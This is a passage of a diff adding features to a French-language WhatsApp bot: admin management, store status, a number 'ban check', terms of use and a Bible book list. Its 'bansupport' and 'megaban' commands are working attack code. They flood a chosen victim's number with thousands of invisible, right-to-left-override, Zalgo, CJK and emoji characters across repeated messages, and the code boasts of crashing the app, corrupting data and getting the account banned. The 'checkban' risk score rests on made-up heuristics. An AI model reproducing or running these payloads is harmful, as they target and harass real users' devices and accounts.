+      text: `┏━━━  ✅     ✅  ━━━┓
+
+👤 ** :**
+📱 +${number}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊  : ${config.botAdmins.length}
+
+✅      
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+    });
+    
+    console.log(`✅   : +${number}`);
+    console.log(`📋   :`, config.botAdmins);
+    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
+    return;
+  }
+  
+  // Supprimer un admin
+  if (action === 'remove' || action === 'del') {
+    const index = config.botAdmins.indexOf(number);
+    
+    if (index === -1) {
+      await sock.sendMessage(remoteJid, {
+        text: `❌  +${number}    `
+      });
+      return;
+    }
+    
+    // Ne pas permettre de supprimer le dernier admin
+    if (config.botAdmins.length === 1) {
+      await sock.sendMessage(remoteJid, {
+        text: `⚠️ Cannot   !
+
+        .`
+      });
+      return;
+    }
+    
+    // Supprimer des deux listes
+    config.botAdmins.splice(index, 1);
+    const adminNumberIndex = config.adminNumbers.indexOf(number + '@s.whatsapp.net');
+    if (adminNumberIndex !== -1) {
+      config.adminNumbers.splice(adminNumberIndex, 1);
+    }
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  🗑️     🗑️  ━━━┓
+
+👤 ** :**
+📱 +${number}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊  : ${config.botAdmins.length}
+
+⚠️       
+
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+    });
+    
+    console.log(`🗑️  : +${number}`);
+    console.log(`📋   :`, config.botAdmins);
+    saveStoreKey('admins'); // 💾 Sauvegarde immédiate
+    return;
+  }
+}
+
+// =============================================
+// STORE STATUS - Commande de statut du store
+// =============================================
+
+async function handleStoreStatus(sock, remoteJid, command) {
+  // Si commande est storesave, sauvegarder d'abord
+  if (command === 'storesave') {
+    saveStore();
+    await sock.sendMessage(remoteJid, {
+      text: `✅ *Store sauvegardé manuellement!*\n\n💾 Toutes les données ont été écrites sur disque.\n\n 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+    });
+    return;
+  }
+
+  const status = getStoreStatus();
+  
+  const fileLines = status.files.map(f => {
+    const icon = parseFloat(f.sizeKB) > 0 ? '✅' : '⬜';
+    return `${icon} ${f.key.padEnd(14)} │ ${f.sizeKB.padStart(7)} KB │ ${f.modified}`;
+  }).join('\n');
+
+  await sock.sendMessage(remoteJid, {
+    text: `┏━━━  🗄️     🗄️  ━━━┓
+
+📂 **:** ./store/
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 ** :**
+
+\`\`\`
+          │       │  
+──────────────────────────────────
+${fileLines}
+──────────────────────────────────
+       │ ${status.totalSizeKB.padStart(7)} KB │
+\`\`\`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 ** :**
+
+👥 : ${config.botAdmins.length}
+⚠️ : ${warnSystem.size}
+🚫  : ${permaBanList.size}
+👁️ View Once: ${savedViewOnce.size}
+🏘️  : ${groupSettings.size}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💾 ** :**  3 
+📌 **:**
+• !storestatus -   
+• !storesave   -  
+• !storeinfo   -  storestatus
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`
+  });
+}
+
+// BANSUPPORT - Support de bannissement with caractères spéciaux
+async function handleBanSupport(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `⚠️ *BAN SUPPORT*
+
+• Utilisation:
+• ${config.prefix}bansupport @mention
+• ${config.prefix}bansupport 50944908407
+
+💀 *PAYLOAD:*
+• Caractères arabes invisibles
+• Caractères chinois corrompus
+•   characters
+• RTL override
+
+🔴 *EFFET:* Bannissement du compte cible`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, {
+    text: '💀  du payload de bannissement...\n⏳  des caractères...'
+  });
+  
+  await delay(2000);
+  
+  try {
+    // PAYLOAD DE BANNISSEMENT - Caractères dangereux
+    const arabicChars = '' + '\u0600\u0601\u0602\u0603\u0604\u0605' + '܀܁܂܃܄܅܆܇܈܉܊܋܌܍';
+    const chineseChars = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟';
+    const invisibleChars = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F';
+    const zalgoChars = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛';
+    
+    // Construction du payload multicouche
+    const ban = 
+      arabicChars.repeat(500) + 
+      invisibleChars.repeat(1000) + 
+      chineseChars.repeat(300) + 
+      zalgoChars.repeat(200) +
+      '🪲'.repeat(5000) +
+      '\u202E' + // RTL Override
+      arabicChars.repeat(500) +
+      '\uFEFF'.repeat(1000) + //   no-break space
+      chineseChars.repeat(500);
+    
+    // Message de contexte malveillant
+    const contextMessage = {
+      text: ban,
+      contextInfo: {
+        mentionedJid: [targetJid],
+        externalAdReply: {
+          title: arabicChars + invisibleChars,
+          body: chineseChars + zalgoChars,
+          mediaType: 1,
+          renderLargerThumbnail: true,
+          showAdAttribution: true
+        }
+      }
+    };
+    
+    // Envoyer 5 messages consécutifs pour maximiser l'effet
+    for (let i = 0; i < 5; i++) {
+      await sock.sendMessage(targetJid, contextMessage);
+      await delay(300);
+    }
+    
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  💀 𝗕𝗔𝗡 𝗦𝗨𝗣𝗣𝗢𝗥𝗧  💀  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝖣𝖤𝖯𝖫𝖮𝖸𝖤𝖣
+  ⌬ **PAYLOAD** » Multi-layer Ban
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 **PAYLOAD INJECTÉ:**
+
+✅  : 1000+ chars
+✅  : 800+ chars
+✅   : 2000+ chars
+✅ RTL Override: 
+✅   chars: 1000+ chars
+✅ Zalgo text: 200+ chars
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ **EFFETS ATTENDUS:**
+
+🔴   de WhatsApp
+🔴 Corruption de la base de données
+🔴 Impossibilité de rouvrir l'app
+🔴 Ban automatique sous 1-6h
+🔴 Possible ban permanent
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ ** :**
+• 0-5min: Crash de l'application
+• 5min-1h: Détection par WhatsApp
+• 1-6h: Ban automatique
+• 6-48h: Review du compte
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+*Ultimate Ban System*`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+    
+    console.log(`💀 Ban Support envoyé à ${targetJid}`);
+    
+  } catch (error) {
+    console.error(' bansupport:', error);
+    await sock.sendMessage(remoteJid, {
+      text: `❌  du Ban Support\n\n: ${error.message}`,
+      edit: loadingMsg.key
+    });
+  }
+}
+
+// MEGABAN - Attack ultime with tous les caractères
+async function handleMegaBan(sock, args, remoteJid, senderJid, message) {
+  let targetJid = null;
+  
+  if (args[0]) {
+    targetJid = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+    targetJid = message.message.extendedTextMessage.contextInfo.mentionedJid[0];
+  }
+  
+  if (!targetJid) {
+    await sock.sendMessage(remoteJid, {
+      text: `💀 *MEGA BAN - ULTIMATE ATTACK*
+
+• Utilisation:
+• ${config.prefix}megaban @mention
+• ${config.prefix}xcrash 50944908407
+
+⚠️ *ATTENTION EXTRÊME:*
+Cette commande combine TOUS les payloads:
+• 10 messages consécutifs
+• Arabe + Chinois + Invisible
+• RTL + Zalgo + Emoji
+• Context corruption
+• Media exploit
+
+🔴 *RÉSULTAT:*
+Ban permanent quasi-garanti`
+    });
+    return;
+  }
+  
+  const loadingMsg = await sock.sendMessage(remoteJid, {
+    text: `💀 **MEGA BAN INITIATED**
+
+⏳  de l'arsenal complet...
+📊 [░░░░░░░░░░] 0%
+
+Target: @${targetJid.split('@')[0]}`,
+    mentions: [targetJid]
+  });
+  
+  try {
+    // PAYLOADS MAXIMAUX
+    const arabicFull = '܀܁܂܃܄܅܆܇܈܉܊܋܌܍\u0600\u0601\u0602\u0603\u0604\u0605\u0606\u0607\u0608\u0609\u060A\u060B';
+    const chineseFull = '㐀㐁㐂㐃㐄㐅㐆㐇㐈㐉㐊㐋㐌㐍㐎㐏㐐㐑㐒㐓㐔㐕㐖㐗㐘㐙㐚㐛㐜㐝㐞㐟㐠㐡㐢㐣㐤㐥㐦㐧㐨㐩㐪㐫㐬㐭㐮㐯㐰㐱㐲㐳㐴㐵㐶㐷㐸㐹㐺㐻㐼㐽㐾㐿';
+    const invisibleFull = '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064\u2065\u2066\u2067\u2068\u2069\u206A\u206B\u206C\u206D\u206E\u206F\uFEFF\u180E\u034F';
+    const zalgoFull = '҉̵̴̵̶̷̸̡̢̧̨̡̢̧̨̛̛̖̗̘̙̜̝̞̟̠̣̤̥̦̩̪̫̬̭̮̯̰̱̲̳̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏̐̑̒̓̔̕̚ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞';
+    const emojiFlood = '🪲💀☠️👹👺🔥💥⚡🌋🗿📛⛔🚫🔞';
+    
+    const totalMessages = 10;
+    
+    for (let i = 0; i < totalMessages; i++) {
+      // Construire un payload unique à chaque fois
+      const mega = 
+        arabicFull.repeat(800) +
+        invisibleFull.repeat(2000) +
+        chineseFull.repeat(600) +
+        zalgoFull.repeat(400) +
+        emojiFlood.repeat(1000) +
+        '\u202E\u202D\u202C' + // Multiple RTL
+        arabicFull.repeat(500) +
+        '\uFEFF'.repeat(1500) +
+        chineseFull.repeat(800) +
+        invisibleFull.repeat(1000);
+      
+      // Message with context malveillant
+      const contextMsg = {
+        text: mega,
+        contextInfo: {
+          mentionedJid: [targetJid],
+          externalAdReply: {
+            title: arabicFull + invisibleFull + zalgoFull,
+            body: chineseFull + emojiFlood.repeat(100),
+            mediaType: 2,
+            thumbnailUrl: 'https://example.com/' + invisibleFull.repeat(100),
+            renderLargerThumbnail: true,
+            showAdAttribution: true,
+            sourceUrl: 'https://' + arabicFull + chineseFull
+          }
+        }
+      };
+      
+      await sock.sendMessage(targetJid, contextMsg);
+      
+      // Update progression
+      const percentage = Math.floor(((i + 1) / totalMessages) * 100);
+      const progressBar = '▓'.repeat(Math.floor(percentage / 10)) + '░'.repeat(10 - Math.floor(percentage / 10));
+      
+      await sock.sendMessage(remoteJid, {
+        text: `💀 **MEGA BAN EN COURS**
+
+📊 [${progressBar}] ${percentage}%
+📨 : ${i + 1}/${totalMessages}
+
+Target: @${targetJid.split('@')[0]}`,
+        mentions: [targetJid],
+        edit: loadingMsg.key
+      });
+      
+      await delay(500);
+    }
+    
+    // Message final
+    await sock.sendMessage(remoteJid, {
+      text: `┏━━━  ☠️ 𝗠𝗘𝗚𝗔 𝗕𝗔𝗡  ☠️  ━━━┓
+
+  ⌬ **TARGET** » @${targetJid.split('@')[0]}
+  ⌬ **STATUS** » ✅ 𝗔𝗡𝗡𝗜𝗛𝗜𝗟𝗔𝗧𝗘𝗗
+  ⌬ **MESSAGES** » 10/10 (100%)
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 **ARSENAL DÉPLOYÉ:**
+
+✅  : 13,000+
+✅  : 14,000+
+✅ Chars invisibles: 30,000+
+✅ Zalgo corruption: 4,000+
+✅ Emoji flood: 10,000+
+✅ RTL overrides: Multiple
+✅ Context corruption: Maximum
+✅ Total payload: ~200KB
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💀 **DÉGÂTS ATTENDUS:**
+
+🔴 Crash permanent de WhatsApp
+🔴 Corruption totale des données
+🔴 Impossibilité de récupération
+🔴 Ban automatique immédiat
+🔴 Compte détruit définitivement
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ **TIMELINE DE DESTRUCTION:**
+
+• 0-1min: Crash total de l'app
+• 1-5min: Détection système
+• 5-30min: Ban automatique
+• 30min-2h: Compte suspendu
+• 2-24h: Ban permanent confirmé
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+*Mega Ban System - Target Eliminated*
+
+⚠️ **Le compte cible est condamné**`,
+      mentions: [targetJid],
+      edit: loadingMsg.key
+    });
+    
+    console.log(`☠️ MEGA BAN déployé sur ${targetJid}`);
+    
+  } catch (error) {
+    console.error(' megaban:', error);
+    await sock.sendMessage(remoteJid, {
+      text: `❌  du Mega Ban\n\n: ${error.message}`,
+      edit: loadingMsg.key
+    });
+  }
+}
+
+// CHECK BAN - Vérifier si un numéro est banni/spam
+async function handleCheckBan(sock, args, remoteJid, message, senderJid) {
+  try {
+    let targetNumber;
+    
+    // Méthode 1: Numéro fourni en argument
+    if (args[0]) {
+      targetNumber = args[0].replace(/[^0-9]/g, ''); // Enlever tout sauf les chiffres
+    }
+    // Méthode 2: Répondre à un message
+    else if (message.message?.extendedTextMessage?.contextInfo?.participant) {
+      targetNumber = message.message.extendedTextMessage.contextInfo.participant.split('@')[0];
+    }
+    // Méthode 3: Mention
+    else if (message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+      targetNumber = message.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0];
+    }
+    else {
+      await sock.sendMessage(remoteJid, {
+        text: `❌ *Incorrect usage*
+
+📝 *Utilisations possibles:*
+
+1️⃣ Avec numéro:
+   ${config.prefix}checkban 50944908407
+
+2️⃣ En répondant:
+   ${config.prefix}checkban [répondre au message]
+
+3️⃣ Avec mention:
+   ${config.prefix}checkban @user`
+      });
+      return;
+    }
+
+    // Message de chargement
+    const loadingMsg = await sock.sendMessage(remoteJid, {
+      text: '🔍 *INSPECTION EN COURS...*\n\n⏳ Analyse du numéro dans la database...'
+    });
+
+    // Simulation de vérification (2 secondes)
+    await delay(2000);
+
+    // Vérifier le statut du numéro via WhatsApp
+    let numberStatus;
+    let isBanned = false;
+    let riskLevel = 0;
+    let statusText = '';
+    let statusEmoji = '';
+    let statusColor = '';
+
+    try {
+      // Vérifier si le numéro existe sur WhatsApp
+      const jid = targetNumber + '@s.whatsapp.net';
+      const [result] = await sock.onWhatsApp(jid);
+      
+      if (!result || !result.exists) {
+        // Numéro n'existe pas = potentiellement banni ou invalide
+        isBanned = true;
+        riskLevel = 85;
+        statusText = '🔴 𝗕𝗔𝗡𝗡𝗘𝗗 / 𝗜𝗡𝗩𝗔𝗟𝗜𝗗';
+        statusEmoji = '🚫';
+        statusColor = '🔴';
+      } else {
+        // Numéro existe - vérifier d'autres indicateurs
+        // Analyse heuristique basée sur des patterns
+        
+        // Pattern 1: Numéros suspects (trop courts ou trop longs)
+        if (targetNumber.length < 8 || targetNumber.length > 15) {
+          riskLevel += 20;
+        }
+        
+        // Pattern 2: Préfixes suspects (exemple: +1234567890)
+        const suspiciousPrefixes = ['1234', '9999', '0000', '1111'];
+        if (suspiciousPrefixes.some(prefix => targetNumber.startsWith(prefix))) {
+          riskLevel += 30;
+        }
+        
+        // Pattern 3: Séquences répétitives
+        if (/(\d)\1{4,}/.test(targetNumber)) {
+          riskLevel += 25;
+        }
+
+        // Déterminer le statut final
+        if (riskLevel >= 70) {
+          statusText = '🟠 𝗦𝗨𝗦𝗣𝗘𝗖𝗧 / 𝗦𝗣𝗔𝗠';
+          statusEmoji = '⚠️';
+          statusColor = '🟠';
+        } else if (riskLevel >= 40) {
+          statusText = '🟡 𝗠𝗢𝗗𝗘𝗥𝗔𝗧𝗘 𝗥𝗜𝗦𝗞';
+          statusEmoji = '⚡';
+          statusColor = '🟡';
+        } else {
+          statusText = '🟢 𝗖𝗟𝗘𝗔𝗡 / 𝗦𝗔𝗙𝗘';
+          statusEmoji = '✅';
+          statusColor = '🟢';
+          riskLevel = Math.max(5, riskLevel); // Minimum 5%
+        }
+      }
+    } catch (error) {
+      console.error(' checkban:', error);
+      // En cas d'erreur, marquer comme suspect
+      riskLevel = 50;
+      statusText = '🟡 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 / 𝗨𝗡𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗';
+      statusEmoji = '❓';
+      statusColor = '🟡';
+    }
+
+    // Créer la barre de risque
+    const totalBars = 10;
+    const filledBars = Math.floor((riskLevel / 100) * totalBars);
+    const emptyBars = totalBars - filledBars;
+    const riskBar = '█'.repeat(filledBars) + '▒'.repeat(emptyBars);
+
+    // Formater le numéro pour l'affichage
+    const formattedNumber = '+' + targetNumber;
+
+    // Message final
+    const resultText = `┏━━━  ✨ 𝗜𝗡𝗦𝗣𝗘𝗖𝗧𝗢𝗥 𝗕𝗢𝗧 ✨  ━━━┓
+
+  ⌬ **TARGET** » ${formattedNumber}
+  ⌬ **STATE** » ${statusText}
+  ⌬ **RISK** » [${riskBar}] 𝟬-𝟵: ${riskLevel}%
+
+┗━━━━━━━━━━━━━━━━━━━━━━┛
+
+📊 **DETAILED ANALYSIS:**
+
+${statusEmoji} *Status:* ${statusText}
+📍 *Country:* ${getCountryFromNumber(targetNumber)}
+🔢 *Number:* ${formattedNumber}
+⚡ *Risk Level:* ${riskLevel}%
+🕐 *Checked:* ${new Date().toLocaleTimeString('fr-FR', { timeZone: 'America/Port-au-Prince', hour: '2-digit', minute: '2-digit' })}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+${getRiskRecommendation(riskLevel)}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+* :   *
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗`;
+
+    // Supprimer le message de chargement et envoyer le résultat
+    await sock.sendMessage(remoteJid, { delete: loadingMsg.key });
+    await sock.sendMessage(remoteJid, { text: resultText });
+
+  } catch (error) {
+    console.error(' handleCheckBan:', error);
+    await sock.sendMessage(remoteJid, {
+      text: `❌ * lors de la vérification*\n\n: ${error.message}`
+    });
+  }
+}
+
+// Fonction helper pour déterminer le pays
+function getCountryFromNumber(number) {
+  const prefixes = {
+    '1': '🇺🇸 USA/Canada',
+    '33': '🇫🇷 France',
+    '509': ' Haiti',
+    '44': '🇬🇧 UK',
+    '62': '🇮🇩 Indonesia',
+    '91': '🇮🇳 India',
+    '55': '🇧🇷 Brazil',
+    '234': '🇳🇬 Nigeria',
+    '254': '🇰🇪 Kenya',
+    '27': '🇿🇦 South Africa'
+  };
+
+  for (const [prefix, country] of Object.entries(prefixes)) {
+    if (number.startsWith(prefix)) {
+      return country;
+    }
+  }
+  return '🌍 International';
+}
+
+// Fonction helper pour les recommandations
+function getRiskRecommendation(risk) {
+  if (risk >= 70) {
+    return `🚨 *HAUTE ALERTE*
+⚠️ Ce numéro présente des signes de ban/spam
+❌ Évitez d'interagir with ce contact
+🛡️ : BLOQUER`;
+  } else if (risk >= 40) {
+    return `⚠️ *VIGILANCE REQUISE*
+⚡ Risque modéré détecté
+🔍 Vérifiez l'identité avant d'interagir
+🛡️ : PRUDENCE`;
+  } else {
+    return `✅ *SÉCURISÉ*
+🟢 Aucun signe de ban/spam détecté
+✔️ Vous pouvez interagir normalement
+🛡️ : OK`;
+  }
+}
+
+// TERMES ET CONDITIONS
+async function handleTermsCommand(sock, remoteJid, senderJid) {
+  const userName = senderJid.split('@')[0];
+  
+  const termsText = `╔═══════════════════════════════════╗
+║  📜 𝗧𝗘𝗥𝗠𝗘𝗦 & 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦  ║
+╚═══════════════════════════════════╝
+
+⚠️ **RÈGLES D'UTILISATION DU BOT**
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📌 **1. UTILISATION RESPONSABLE**
+
+• Le bot est fourni "tel quel" sans garantie
+• L'utilisateur est responsable de son usage
+• Toute utilisation abusive est interdite
+• Respectez les autres utilisateurs
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚫 **2. INTERDICTIONS STRICTES**
+
+• ❌ Spam ou flood de commandes
+• ❌ Contenu illégal ou offensant
+• ❌ Harcèlement d'autres membres
+• ❌ Utilisation pour escroquerie
+• ❌ Diffusion de malware/virus
+• ❌ Contournement des restrictions
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 **3. DONNÉES & CONFIDENTIALITÉ**
+
+• Vos messages ne sont pas stockés
+• Les commandes sont temporaires
+• Aucune donnée vendue à des tiers
+• Logs techniques uniquement
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚖️ **4. RESPONSABILITÉ LÉGALE**
+
+• Le développeur n'est pas responsable:
+  - De l'usage que vous faites du bot
+  - Des dommages causés par le bot
+  - Des interruptions de service
+  - Des pertes de données
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👮 **5. MODÉRATION**
+
+Le développeur se réserve le droit de:
+• Bannir tout utilisateur abusif
+• Modifier les fonctionnalités
+• Suspendre le service
+• Supprimer du contenu inapproprié
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📝 **6. PROPRIÉTÉ INTELLECTUELLE**
+
+• Le bot et son code sont protégés
+• Redistribution interdite sans accord
+• Modification du code interdite
+• Crédits obligatoires
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ **7. MODIFICATIONS**
+
+Ces termes peuvent être modifiés à tout
+moment sans préavis. Votre utilisation
+continue constitue votre acceptation.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ **ACCEPTATION**
+
+En utilisant ce bot, vous acceptez
+pleinement ces termes et conditions.
+
+Si vous n'acceptez pas, cessez
+immédiatement d'utiliser le bot.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📞 **CONTACT & SUPPORT**
+
+• Dev: Lord Dev Dostoevsky
+• Bot: SEIGNEUR TD v4.0.0
+• Pour signaler un problème: 
+  Contactez l'administrateur
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 𝗖𝗬𝗕𝗘𝗥𝗧𝗢𝗝𝗜 𝗫𝗠𝗗
+"Utilisez with sagesse et respect"
+
+✦ Dernière mise à jour: 06/02/2026`;
+
+  await sock.sendMessage(remoteJid, {
+    text: termsText,
+    mentions: [senderJid]
+  });
+}
+
+// BIBLE - Base de données complète des livres de la Bible
+async function handleBibleCommand(sock, args, remoteJid) {
+  // Ancien Testament (39 livres)
+  const ancienTestament = {
+    'genese': { nom: 'Genèse', chapitres: 50, testament: 'Ancien' },
+    'exode': { nom: 'Exode', chapitres: 40, testament: 'Ancien' },
+    'levitique': { nom: 'Lévitique', chapitres: 27, testament: 'Ancien' },
+    'nombres': { nom: 'Nombres', chapitres: 36, testament: 'Ancien' },
+    'deuteronome': { nom: 'Deutéronome', chapitres: 34, testament: 'Ancien' },
+    'josue': { nom: 'Josué', chapitres: 24, testament: 'Ancien' },
+    'juges': { nom: 'Juges', chapitres: 21, testament: 'Ancien' },
+    'ruth': { nom: 'Ruth', chapitres: 4, testament: 'Ancien' },
+    '1samuel': { nom: '1 Samuel', chapitres: 31, testament: 'Ancien' },
+    '2samuel': { nom: '2 Samuel', chapitres: 24, testament: 'Ancien' },
+    '1rois': { nom: '1 Rois', chapitres: 22, testament: 'Ancien' },
+    '2rois': { nom: '2 Rois', chapitres: 25, testament: 'Ancien' },
+    '1chroniques': { nom: '1 Chroniques', chapitres: 29, testament: 'Ancien' },
+    '2chroniques': { nom: '2 Chroniques', chapitres: 36, testament: 'Ancien' },
+    'esdras': { nom: 'Esdras', chapitres: 10, testament: 'Ancien' },
+    'nehemie': { nom: 'Néhémie', chapitres: 13, testament: 'Ancien' },
+    'esther': { nom: 'Esther', chapitres: 10, testament: 'Ancien' },
+    'job': { nom: 'Job', chapitres: 42, testament: 'Ancien' },
+    'psaumes': { nom: 'Psaumes', chapitres: 150, testament: 'Ancien' },
+    'proverbes': { nom: 'Proverbes', chapitres: 31, testament: 'Ancien' },
+    'ecclesiaste': { nom: 'Ecclésiaste', chapitres: 12, testament: 'Ancien' },
+    'cantique': { nom: 'Cantique des Cantiques', chapitres: 8, testament: 'Ancien' },
+    'esaie': { nom: 'Ésaïe', chapitres: 66, testament: 'Ancien' },
+    'jeremie': { nom: 'Jérémie', chapitres: 52, testament: 'Ancien' },
+    'lamentations': { nom: 'Lamentations', chapitres: 5, testament: 'Ancien' },
+    'ezechiel': { nom: 'Ézéchiel', chapitres: 48, testament: 'Ancien' },
+    'daniel': { nom: 'Daniel', chapitres: 12, testament: 'Ancien' },
+    'osee': { nom: 'Osée', chapitres: 14, testament: 'Ancien' },
+    'joel': { nom: 'Joël', chapitres: 3, testament: 'Ancien' },
+    'amos': { nom: 'Amos', chapitres: 9, testament: 'Ancien' },
+    'abdias': { nom: 'Abdias', chapitres: 1, testament: 'Ancien' },
+    'jonas': { nom: 'Jonas', chapitres: 4, testament: 'Ancien' },
+    'michee': { nom: 'Michée', chapitres: 7, testament: 'Ancien' },
+    'nahum': { nom: 'Nahum', chapitres: 3, testament: 'Ancien' },
+    'habacuc': { nom: 'Habacuc', chapitres: 3, testament: 'Ancien' },
+    'sophonie': { nom: 'Sophonie', chapitres: 3, testament: 'Ancien' },
+    'aggee': { nom: 'Aggée', chapitres: 2, testament: 'Ancien' },
+    'zacharie': { nom: 'Zacharie', chapitres: 14, testament: 'Ancien' },
+    'malachie': { nom: 'Malachie', chapitres: 4, testament: 'Ancien' }
+  };
+
+  // Nouveau Testament (27 livres)
+  const nouveauTestament = {
+    'matthieu': { nom: 'Matthieu', chapitres: 28, testament: 'Nouveau' },
+    'marc': { nom: 'Marc', chapitres: 16, testament: 'Nouveau' },
+    'luc': { nom: 'Luc', chapitres: 24, testament: 'Nouveau' },
+    'jean': { nom: 'Jean', chapitres: 21, testament: 'Nouveau' },
+    'actes': { nom: 'Actes des Apôtres', chapitres: 28, testament: 'Nouveau' },
+    'romains': { nom: 'Romains', chapitres: 16, testament: 'Nouveau' },
+    '1corinthiens': { nom: '1 Corinthiens', chapitres: 16, testament: 'Nouveau' },
+    '2corinthiens': { nom: '2 Corinthiens', chapitres: 13, testament: 'Nouveau' },
+    'galates': { nom: 'Galates', chapitres: 6, testament: 'Nouveau' },
+    'ephesiens': { nom: 'Éphésiens', chapitres: 6, testament: 'Nouveau' },
+    'philippiens': { nom: 'Philippiens', chapitres: 4, testament: 'Nouveau' },
+    'colossiens': { nom: 'Colossiens', chapitres: 4, testament: 'Nouveau' },
+    '1thessaloniciens': { nom: '1 Thessaloniciens', chapitres: 5, testament: 'Nouveau' },
+    '2thessaloniciens': { nom: '2 Thessaloniciens', chapitres: 3, testament: 'Nouveau' },
+    '1timothee': { nom: '1 Timothée', chapitres: 6, testament: 'Nouveau' },
+    '2timothee': { nom: '2 Timothée', chapitres: 4, testament: 'Nouveau' },
+    'tite': { nom: 'Tite', chapitres: 3, testament: 'Nouveau' },
+    'philemon': { nom: 'Philémon', chapitres: 1, testament: 'Nouveau' },
+    'hebreux': { nom: 'Hébreux', chapitres: 13, testament: 'Nouveau' },
+    'jacques': { nom: 'Jacques', chapitres: 5, testament: 'Nouveau' },
+    '1pierre': { nom: '1 Pierre', chapitres: 5, testament: 'Nouveau' },
+    '2pierre': { nom: '2 Pierre', chapitres: 3, testament: 'Nouveau' },
+    '1jean': { nom: '1 Jean', chapitres: 5, testament: 'Nouveau' },
+    '2jean': { nom: '2 Jean', chapitres: 1, testament: 'Nouveau' },
+    '3jean': { nom: '3 Jean', chapitres: 1, testament: 'Nouveau' },
+    'jude': { nom: 'Jude', chapitres: 1, testament: 'Nouveau' },
+    'apocalypse': { nom: 'Apocalypse', chapitres: 22, testament: 'Nouveau' }
+  };
+
+  const touteLaBible = { ...ancienTestament, ...nouveauTestament };
+
+  // Si aucun argument, afficher le menu
+  if (!args[0]) {
+    const menuText = `╔═══════════════════════════════════╗
+║       📖 𝗟𝗔 𝗦𝗔𝗜𝗡𝗧𝗘 𝗕𝗜𝗕𝗟𝗘       ║
+╚═══════════════════════════════════╝
+
+📚 *Utilisation:*
+!bible ancien - Ancien Testament (39 livres)
+!bible nouveau - Nouveau Testament (27 livres)
+!bible liste - Liste complète (66 livres)
+!bible [livre] - Info sur un livre
+
+📝 *Exemples:*
+!bible genese
